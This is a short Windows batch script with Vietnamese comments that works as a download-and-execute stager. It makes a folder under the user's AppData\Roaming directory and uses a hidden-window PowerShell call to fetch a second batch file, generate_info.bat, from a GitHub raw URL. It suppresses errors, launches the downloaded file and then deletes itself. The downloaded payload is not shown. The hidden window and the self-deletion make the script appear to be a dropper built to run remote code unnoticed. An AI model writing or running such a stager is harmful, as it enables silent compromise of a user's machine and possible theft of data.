@echo off
setlocal

:: Thiết lập các biến
set "url=https://github.com/rspvn/a/raw/main/generate_info.bat"
set "folder=%USERPROFILE%\AppData\Roaming\test"
set "file=generate_info.bat"
set "batfile=%folder%\%file%"

:: Tạo thư mục nếu chưa tồn tại
if not exist "%folder%" (
    mkdir "%folder%"
)

:: Kiểm tra nếu tập tin đã tồn tại và chạy nó
if exist "%batfile%" (
    start "" "%batfile%"
    exit /b
) else (
    :: Tải tập tin từ URL
    powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%batfile%' -ErrorAction SilentlyContinue"
    
    if exist "%batfile%" (
        :: Chạy tập tin .bat đã tải
        start "" "%batfile%"
        
        :: Xóa tập tin .bat này sau khi đã mở
        del "%~f0"
    ) else (
        echo Download failed.
    )
    
    :: Đóng cửa sổ CMD sau 5 giây
    timeout /t 5 /nobreak >nul
    exit /b
)

endlocal
